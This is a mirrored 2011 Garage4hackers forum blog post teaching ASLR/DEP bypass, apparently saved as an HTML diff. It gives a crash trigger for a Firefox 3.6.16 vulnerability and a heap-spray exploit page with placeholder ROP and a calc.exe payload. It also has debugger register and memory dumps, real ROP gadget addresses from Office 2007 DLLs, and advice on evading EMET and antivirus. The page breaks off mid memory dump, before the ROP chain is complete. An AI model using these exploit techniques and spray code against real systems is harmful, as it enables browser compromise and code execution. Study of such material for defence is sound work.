@@ -1,0 +1,2272 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">
+
+<!-- Mirrored from garage4hackers.com/blog.php?b=270&goto=prev by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:52:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+		<meta name="keywords" content="windows 8 dep bypass technique, Windows 8 DEP bypass, ethical hacking,exploits,webapplication,penetration testing,wireless,information security,virus,exploit coding,vbulletin,forum,bbs,discussion,bulletin board,indian hackers" />
+		<meta name="description" content="Windows 8 DEP bypass &quot;vinnu&quot;" />
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="Windows 8 DEP bypass &quot;vinnu&quot;" />
+<meta property="og:url" content="index.html" />
+<meta property="og:type" content="website" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "blog";
+	var RELPATH = "blogf5cd.html?b=270&amp;goto=prev";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+	
+		
+			<link rel="alternate" type="application/rss+xml" title="&quot;vinnu&quot; - Garage4hackers Forum Blog RSS Feed" href="blog_external7858.php?type=RSS2&amp;bloguserid=61" />
+		
+		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Blog RSS Feed" href="blog_external9476.php?type=RSS2" />
+	
+	<link rel="pingback" href="forum.html" />
+	
+		<!--
+			<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+				xmlns:dc="http://purl.org/dc/elements/1.1/"
+				xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+			<rdf:Description
+				rdf:about="http://garage4hackers.com/entry.php?b=242"
+				dc:identifier="http://garage4hackers.com/entry.php?b=242"
+				dc:title="ASLR DEP bypassing techniques"
+				trackback:ping="http://garage4hackers.com/blog_callback.php?b=242" />
+			</rdf:RDF>
+		-->
+	
+	
+		<link rel="stylesheet" type="text/css" href="css68b4.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite.css,blog.css,lightbox.css,attachment.css" />
+	
+	<!--[if lt IE 8]>
+	<script type="text/javascript" src="clientscript/vbulletin-threadlist-ie.js?v=421"></script>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite-ie.css,blog-ie.css" />
+	<![endif]-->
+	
+	
+	
+	
+		<script type="text/javascript">
+		<!--
+			vBulletin.register_control("vB_Blog_Userid", "61");
+		//-->
+		</script>
+	
+<script type="text/javascript" src="clientscript/vbulletin_ajax_suggest6719.js?v=421"></script>
+	
+		<title>ASLR DEP bypassing techniques - Blogs - Garage4hackers Forum</title>
+	
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body >
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id="vbblog_recent"><a href="blog2d60.html?do=list">Recent Entries</a></li>
+						
+					
+				
+					
+						
+							<li id="vbblog_popular"><a href="blog7e3c.html?do=list&amp;blogtype=best">Most Popular</a></li>
+						
+					
+				
+					
+						
+							<li id="vbblog_member"><a href="blogd08d.html?do=bloglist">Member Blogs</a></li>
+						
+					
+				
+			</ul>
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="blog.html">Blogs</a></li>
+
+	<li class="navbit"><a href="blogf35f.html?u=61">&quot;vinnu&quot;</a></li>
+
+		
+	<li class="navbit lastnavbit"><span>ASLR DEP bypassing techniques</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/blog.php?b=270&goto=prev by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:52:01 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+<div id="usercss" class="blog">
+	<div class="cleardiv"></div>
+
+	
+	
+	<div id="content_container">
+		<div id="content">
+			<div id="content_inner" class="blockrow restrain_container">
+			<!-- main content -->
+			<div id="pagetitle">
+	
+	<a id="rssicon" href="blog_external7858.php?type=RSS2&amp;bloguserid=61" rel="nofollow"><img src="images/misc/rss_40b.html" border="0" class="inlineimg" alt="View RSS Feed" /></a>
+	
+	<h1>&quot;vinnu&quot;</h1>
+</div>
+
+
+
+
+<div id="ad_blogshowentry_before"><script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/11/10 blog entry */
+google_ad_slot = "0606213533";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+<div id="above_blogentry">
+	
+</div>
+<div class="block blogentrybit" id="entry242">
+	<h4 id="blog_title" class="blog_header">
+		ASLR DEP bypassing techniques
+		
+		
+	</h4>
+	<div class="fly">
+		
+			<div class="popupmenu" id="blograting">
+				<h6><a class="popupctrl" href="javascript://" id="blograting_current"><img class="inlineimg" src="images/rating/rating-15_5.html" alt="Rating: 9 votes, 4.56 average." /></a></h6>
+				<form action="../external.html?link=http://garage4hackers.com/blog.php" method="post" id="blog_blograte_form">
+					<div class="popupbody popuphover">
+						<ul>
+							
+								<li><label for="r5"><span class="rating r5">
+									<input type="radio" name="vote" value="5" id="r5"  /> Excellent
+								</span></label></li>
+								<li><label for="r4"><span class="rating r4_right">
+									<input type="radio" name="vote" value="4" id="r4"  /> Good
+								</span></label></li>
+								<li><label for="r3"><span class="rating r3_right">
+									<input type="radio" name="vote" value="3" id="r3"  /> Average
+								</span></label></li>
+								<li><label for="r2"><span class="rating r2_right">
+									<input type="radio" name="vote" value="2" id="r2"  /> Bad
+								</span></label></li>
+								<li><label for="r1"><span class="rating r1_right">
+									<input type="radio" name="vote" value="1" id="r1"  /> Terrible
+								</span></label></li>
+								<li class="formsubmit"><input type="submit" class="button" value="Vote Now" /></li>
+							
+						</ul>
+						<input type="hidden" name="s" value="" />
+						<input type="hidden" name="securitytoken" value="guest" />
+						<input type="hidden" name="do" value="rate" />
+						<input type="hidden" name="b" value="242" />
+					</div>
+				</form>
+				<script type="text/javascript" src="clientscript/blog_ajax_rate6719.html?v=421"></script>
+				<script type="text/javascript">
+				<!--
+					var blogid = 242;
+					vB_AJAX_BlogRate_Init('blog_blograte_form');
+				//-->
+				</script>
+			</div>
+		
+	</div>
+	<div class="block blogbit">
+		<div class="bloghead">
+			<div class="fly">
+				
+<a href="entry9367.html?b=242#comments" class="comments">4 Comments</a>
+				
+				
+			</div>
+			<div class="blog_date">
+				by <div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>, 09-21-2011 at 11:22 AM  (9105 Views)
+			</div>
+		</div>
+		
+		<div class="blogbody postcontainer">
+			<div id="entry_text_242">
+				<blockquote class="blogcontent restore floatcontainer">
+					In defeating DEP you atleast need some information that will evade the ASLR.<br />
+There are mainly two ways:<br />
+<br />
+1. Any anti ASLR modules gets loaded into the target application. I mean you have the base address of any module at fixed location always even after the system restart.<br />
+<br />
+2. You get a pointer leak from a memory leak/buffer overflow/any zeroday. In this technique you can adjust the offsets to grab the base address of the module whose pointer gets leaked.<br />
+<br />
+Now, you have evaded the ASLR. Now comes the DEP:<br />
+<br />
+DEP Data Execution Prevention mitigates the most of the attacks by denying the code execution from non executable memory, earlier until xp sp2, the stack and heap were executable, but now they no more possess execute attribute.<br />
+<br />
+But there are methods, you have a pointer, so you can either make your shellcode from ROP, rop is a little advanced return to libc attack and is return oriented programming.<br />
+<br />
+The main idea is to execute the necessary instructions nearby the &quot;return&quot; instruction, but for return instruction, you need to control the stack, the top of the stack must have the address of next instruction where you want to land and all these instructions are chosen or discovered from already loaded executable modules and from there executable code pages.<br />
+<br />
+I have discovered most of the rop chains online, but nearly all are the products of certain automatyed scripts, I mean if you want to learn then start doing it manually, otherwise you'll miss the whole technique.<br />
+The most intelligent ROP chains are discovered manually, and are very specific and provide more control in very small execution overhead.<br />
+<br />
+One more thing to remember, most of the rop chains produced by automated scripts, are not suitable for certain type of vulnerabilities, then you might know how to develop one of yours own.<br />
+<br />
+Using the ROP you can either develop whole of your shellcode or just for the purpose of defeating DEP and then landing on the executable marked shellcode.<br />
+<br />
+Remember, the OS has very good randomization of module bases, stack and heap and pointers, but not the pointers to the pointers, in certain places, you can easily find, fixed addresses/pointer to another pointer inside any other module or to any export of any dll.<br />
+<br />
+Such informations help a lot.<br />
+<br />
+the memory leaks also help, e.g.<br />
+<br />
+function alfa(){<br />
+var a1=document.cookie;<br />
+}<br />
+var a=window.setTimeout(alfa,100);<br />
+alert(a.toString(16));<br />
+<br />
+The above leak is little old now, and provides us witha memory address inside mshtml.dll at the address rendered by a.toString(16)-1<br />
+<br />
+.This was a good pointer to pointer, similarly, 0x7ffe360 in this line you can find the base address of ntdll.dll in win7 64 bit<br />
+whereas in all windows 32 bit versions, 7ffe300 has the addressof sysenter and 0x7ffe304 the ret instruction.<br />
+<br />
+But all these are pointer to pointers i.e. **<br />
+whereas to form a shellcode dynamically, we need a direct pointer.<br />
+I think you better know now the pwn2own memory leak by a buffer overflow.<br />
+<br />
+The custom shellcodes manufactured dynamically from memory leaks of pointers, can be simple and provide us with more control, than the other traditional shellcodes developed by msf etc.<br />
+<br />
+The main advantage of custom shellcodes made by pointer leaks are that, you can easily evade the mitigations like, emet (enhanced mitigation toolikit) and other av engines.<br />
+<br />
+Recomendation : Download and install the ~= 4.5 Mb emet from microsoft to secure yourself. It will fail the executaion of most of your traditional shellcodes.<br />
+<br />
+In next posts, we'll discus about certain vulnerabilities and then evade develop the exploit and try to develop the shellcode and rop chains in this thread. Hope you 'll enjoy and will actively take part.<br />
+...to be continued<br />
+<br />
+--------------------------------------------<br />
+In the world of ASLR and DEP remember there is no place for NOP and NOPsled. Only precision matters.<br />
+<br />
+The sprayer must be developed in such a way that it will place your chunks (rop + shellcode) at fixed locations.<br />
+<br />
+The slip of even a single byte is non preferable as it will make our rop to land at wrong addresses. The precision can be achieved by heap manipulation techniques. I'll recommend to study the &quot;Heap Fengshui&quot; by A. Satirov.<br />
+<br />
+By proper allocation of calculated sized heap chunks, we can more precisely place our chunks at same addresses every time.<br />
+<br />
+Let us proceed with the example and in coding. The example vulnerability (mchannel) is affecting Firefox 3.6.16 and its working exploits are already available. But we'll develop the ROP and shellcode manually and hand crafted no need of mona or anything automated as automation misses certain points and makes the things complex and the solutions are not so intelligent and simple. <br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:204px;">&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;object id=&quot;d&quot; &gt;&lt;/object&gt;
+&lt;script&gt;
+function ignite()	{
+	var e=document.getElementById(&quot;d&quot;);
+	e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
+        e.data=&quot;&quot;;
+}
+&lt;/script&gt;
+&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div><br />
+In this vulnerability, we can control the ECX register as the place from where EAX register will grab the value can be controlled by a single object instantiation in heap.<br />
+<br />
+var obj = unescape(&quot;\x00&#3088;&quot;); // will make ECX register to point to at 0x0C100000<br />
+// This is the address that will easily get sprayed and where the first byte of our chunk will be loaded.<br />
+<br />
+<br />
+Note: Remember to rename the CrashReporter.exe from mozilla folder inside ur program files. And attach the debugger to the firefox before exploiting the vulnerability.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:108px;">6BE14E69   8B08             MOV ECX,DWORD PTR DS:[EAX] ; This is where our above allocation will load 0x0C100000 into
+; ECX register
+6BE14E6B   BE 02004B80      MOV ESI,804B0002
+6BE14E70   56               PUSH ESI
+6BE14E71   50               PUSH EAX
+6BE14E72   FF51 18          CALL DWORD PTR DS:[ECX+18] ; This is where call will be transferred at address placed at
+; 0x0C100018, So we need to frame our rop+shellcode module accordingly.</pre>
+</div>Next comes the sprayer and ROP +shellcode. First of all we'll use dummy chunk in place of ROP+shellcode and slowly develop the ROP and shellcode over the dummy chunk. so let us proceed. For countering ASLR i'll use the GrooveUtil.dll &amp; GR469A~1.DLL which comes along with MS office 2007 in GrooveMonitor. These DLLs gets loaded into browsers by default. If default installation of MS OFFICE 2007 is done.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;object id=&quot;d&quot; &gt;&lt;/object&gt;
+&lt;script&gt;
+
+function ignite()	{
+	var e=document.getElementById(&quot;d&quot;);
+	e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
+	
+	var vftable = unescape(&quot;\x00% u0c10&quot;);
+	// ROP using GrooveUtil.dll :
+	var heap = unescape(
+/* ROP : */			&quot;% u0101% u0102&quot;
+					+&quot;% u0103% u0104&quot;
+					+&quot;% u0105% u0106&quot;
+					+&quot;% u0107% u0108&quot;
+					+&quot;% u0109% u010a&quot;
+					+&quot;% u010b% u010c&quot;
+					+&quot;% u010d% u010e&quot;
+					+&quot;% u010f% u0111&quot;
+					+&quot;% u0112% u0113&quot;
+					+&quot;% u0114% u0115&quot;
+					+&quot;% u0116% u0117&quot;
+					+&quot;% u0118% u0119&quot;
+					+&quot;% u011a% u011b&quot;
+					+&quot;% u011c% u011d&quot;
+					+&quot;% u011e% u011f&quot;
+					)
+/* Shellcode : */	+unescape(&quot;% u9090% u9090&quot;+&quot;% u9090% u9090&quot;
+					+&quot;% uCCCC% uCCCC% uCCCC% uCCCC&quot;
+					+&quot;% uBBBB% uCCCC% uDDDD% uEEEE&quot;
+/* command: */		+&quot;% u6163% u636c% u652e% u6578% u0000% ucccc&quot;	// calc.exe
+					);
+
+		var vtable = unescape(&quot;% u0c0c% u0c0c&quot;);
+        while(vtable.length &lt; 0x10000) {vtable += vtable;}
+        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
+        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
+		var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
+        var spray = new Array()
+        for (var iter=0;iter&lt;0x100;iter++){
+           spray[iter] = finalspray+heap;
+        }
+	e.data=&quot;&quot;;
+}
+&lt;/script&gt;
+&lt;input type=button value=&quot;Ignite&quot; onclick=&quot;ignite()&quot; /&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+</div>Note : In code I've to place a blank space between &quot;%&quot; and &quot;u&quot; as unicode support is converting the blocks into respective characters, remember to remove these spaces from all blocks inside unescape blocks. <br />
+<br />
+One more thing, We are going to develop this exploit for win7 -win32 (you may check offsets for winxp, even offsets in win32 &amp; wow64 win7 also differs check them and fix them).<br />
+<br />
+Also install the EMET from microsoft website, It mitigates most of the shellcodes. But our shellcode will also bypass it and will be compact. <br />
+<br />
+Here is the result of above code:<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:132px;">EAX 0400B620
+ECX 0C100000
+EDX 0313D970
+EBX 043D0E04
+ESP 0018DFCC
+EBP 0018E1D8
+ESI 804B0002
+EDI 80000000
+EIP 010E010D</pre>
+</div>The EIP register has been controlled by loading in a value from our chunk 0x010E010D. This value comes from &quot;&#269;%u 010E&quot;.<br />
+So we'll have to place the pointer of our first ROP gadget at &quot;%u 010D%u 010E&quot; place.<br />
+<br />
+The first task is to develop the ROP now and in ROP the first and most important and challenging task is the stack pivoting.<br />
+In stack pivot, the ESP register is loaded with the address to our own allocated heap chunk so that the browser will consider the allocated heap chunk as stack and this new manipulated stack contains all the return addresses and arguments to the called functions.<br />
+<br />
+What we have to do actually is we need to either move or swap the register containing address to our allocated heap block into ESP register. Or pop an address of our heap block from stack into ESP register, there can be several instructions.<br />
+<br />
+In this case the EAX register contains the pointer to pointer (pointer to address) of our allocated heap block and ecx contain the direct address to our allocated heap chunk.<br />
+So we need to discover the gadgets which encorporates either eax or ecx registers in case of stack pivoting. <br />
+<br />
+There are certain instructions like:<br />
+<br />
+<br />
+XCHG ECX,ESP<br />
+ret<br />
+<br />
+or<br />
+<br />
+mov esp,ecx<br />
+ret<br />
+<br />
+or<br />
+<br />
+XCHG dword ptr[EAX],ESP<br />
+ret<br />
+<br />
+or<br />
+<br />
+mov ESP,dword ptr[EAX]<br />
+ret<br />
+<br />
+or like these can be of help.<br />
+<br />
+But alas we cannot find anything useful, but following gadget was discovered:<br />
+<br />
+<br />
+6623BE51 : XCHG EAX,ESP<br />
+ret<br />
+<br />
+<br />
+into GR469A~1.DLL but we need to replace the &quot;pointer to pointer&quot; with direct pointer in EAX register before executing this gadget.<br />
+So we need to discover something like<br />
+<br />
+mov EAX,dword ptr[eax]<br />
+call eax<br />
+ret<br />
+<br />
+But, this following gadget was discovered and was pretty helpful:<br />
+<br />
+<br />
+661C5B33 : MOV EAX,DWORD PTR DS:[ECX]<br />
+CALL DWORD PTR DS:[EAX+8]<br />
+<br />
+<br />
+This gadget needs the address to be loaded into eax register at place where ECX register is pointing.<br />
+The ECX register points to first bytes of our heap block and then the next call will be made to the address at ECX + 8.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:300px;">0C100000  01 01 02 01 03 01 04 01  
+0C100008  05 01 06 01 07 01 08 01  
+0C100010  09 01 0A 01 0B 01 0C 01  ...
+0C100018  0D 01 0E 01 0F 01 11 01  .
+0C100020  12 01 13 01 14 01 15 01  
+0C100028  16 01 17 01 18 01 19 01  
+0C100030  1A 01 1B 01 1C 01 1D 01  
+0C100038  1E 01 1F 01 90 90 90 90  
+0C100040  90 90 90 90 CC CC CC CC  ÌÌÌÌ
+0C100048  CC CC CC CC BB BB CC CC  ÌÌÌÌ»»ÌÌ
+0C100050  DD DD EE EE 63 61 6C 63  ÝÝîîcalc
+0C100058  2E 65 78 65 00 00 CC CC  .exe..ÌÌ
+0C100060  0C 0C 0C 0C 0C 0C 0C 0C  ........
+0C100068  0C 0C 0C 0C 0C 0C 0C 0C  ........
+0C100070  0C 0C 0C 0C 0C 0C 0C 0C  ........
+0C100078  0C 0C 0C 0C 0C 0C 0C 0C  ........
+0C100080  0C 0C 0C 0C 0C 0C 0C 0C  ........
+0C100088  0C 0C 0C 0C 0C 0C 0C 0C  ........
+0C100090  0C 0C 0C 0C 0C 0C 0C 0C  ........
